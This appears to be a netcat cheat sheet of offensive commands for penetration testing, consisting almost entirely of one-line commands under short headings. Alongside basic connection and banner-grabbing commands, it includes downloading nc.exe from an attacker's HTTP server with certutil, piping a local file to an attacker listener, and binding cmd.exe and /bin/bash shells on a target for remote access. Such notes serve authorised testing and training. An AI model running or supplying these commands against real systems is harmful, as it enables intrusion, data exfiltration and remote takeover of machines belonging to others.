## Show nc Help
```text
nc -help
```
---
## Basic TCP Connection to Target
```text
nc <T_IP> 80
```
---
## Verbose TCP Connection Without DNS Resolution
```text
nc -nv <T_IP> 80
```
---
## Check FTP Service and Grab Banner
```text
nc -nv <T_IP> 21
```
---
## UDP Probe for SNMP Service
```text
nc -nvu <T_IP> 161
```
---
## Download nc.exe from Attacker HTTP Server
```text
certutil -urlcache -f http://<A_IP>/nc.exe nc.exe
```
---
## Start Listener Waiting for Incoming Connection
```text
nc -nvlp 1234
```
---
## Send Local File Contents to Attacker Listener
```text
nc -nv <A_IP> 1234 < test.txt
```
---
## Bind cmd Shell on Target (Windows)
```text
nc.exe -nvlp 1234 -e cmd.exe
```
---
## Connect from Attacker to Target Shell
```text
nc -nv <T_IP> 1234
```
---
## Bind Bash Shell on Target (Linux)
```text
nc -nvlp 1234 -e /bin/bash
```
---
## Connect from Attacker to Target Shell
```text
nc.exe -nv <T_IP> 1234
```
